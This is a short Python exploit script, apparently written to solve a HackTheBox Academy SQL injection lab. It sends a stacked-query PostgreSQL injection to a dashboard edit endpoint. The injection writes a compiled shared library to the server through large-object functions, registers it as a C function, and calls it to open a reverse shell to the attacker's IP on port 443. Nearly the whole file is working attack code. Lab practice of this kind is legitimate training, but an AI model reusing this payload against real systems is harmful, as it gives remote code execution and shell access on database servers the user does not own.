#!/usr/bin/env python3

"""Created this script to solve the HackTheBox Academy lab called 'Skills Assessment' for the module called 'Advanced SQL Injections'. 
This script exploits a blind postgreSQL injection to create a PostgreSQL extension which is then used to get a reverse shell.
Open a netcat listener for port 443 before running the script
"""

import random
import string
import requests
import urllib.parse
import os

target= "10.129.18.129:8080" # Change this
proxies= {"http":"http://127.0.0.1:8081"} # Change this
headers= {"Content-Type": "application/x-www-form-urlencoded"}
cookies= {"Authentication":"eyJhbGciOiJIUzUxMiJ9...."} # Change cookie value

def generate_random_word():
    all_chars= string.digits + string.ascii_letters
    random_group = random.sample(all_chars, 16)
    return ''.join(random_group)

random_group = generate_random_word()

def create_content():
    random_num= random.randint(100000,999999)
    beg_data= f"SELECT+lo_create({random_num});"
    full_content= beg_data

    with open(f"/home/test/revshell_compiled_on_postgreSQL13.9/pg_rev_shell.so","rb") as source_file:  # Create revshell.c, compile it, and put into this directory
        read_content= source_file.read()
        content=f"{read_content.hex()}"
        full_content = f"{full_content}SELECT+lo_put({random_num},0,DECODE($${content}$$,$$HEX$$));"
        end_data= f"SELECT+lo_export({random_num},$$/tmp/rev$$);CREATE+FUNCTION+rev_shell(text,+integer)+RETURNS+integer+AS+$$/tmp/rev$$,+$$rev_shell$$+LANGUAGE+C+STRICT;SELECT+rev_shell($$10.12.11.111$$,443)"
        full_content += end_data
        return full_content

full_content= create_content()
payload= f"{full_content}"

data= f"title=Hackthebox&username=quark55&password=9lFfjalekflk4365L&id=1;{payload};--+-"

response= requests.post(url= f"http://{target}/dashboard/edit", proxies=proxies, headers=headers, verify=False, allow_redirects=True, data=data, cookies=cookies)
